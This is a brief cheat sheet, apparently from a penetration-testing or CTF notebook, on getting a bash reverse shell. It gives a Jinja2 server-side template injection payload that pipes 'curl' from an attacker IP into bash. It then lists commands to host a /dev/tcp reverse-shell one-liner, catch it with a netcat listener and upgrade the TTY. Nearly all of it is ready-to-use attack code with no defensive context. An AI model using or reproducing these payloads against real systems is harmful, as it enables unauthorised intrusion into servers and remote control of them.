# Bash reverse shell
  
1. upload the payload to the target.

This example exploits an SSTI using python:

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen("curl 10.10.10.66 | bash").read() }}
```

2. setup the handler

```
# mkdir www
# echo "bash -i >& /dev/tcp/10.10.10.66/9001 0>&1 " > index.html
# python3 -m http.server 80 &
# nc -nlvp 9001
# python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl-Z
ssty raw -echo; fg
user@target:~$ export TERM=xterm
user@target:~$ stty rows 26 cols 80
```



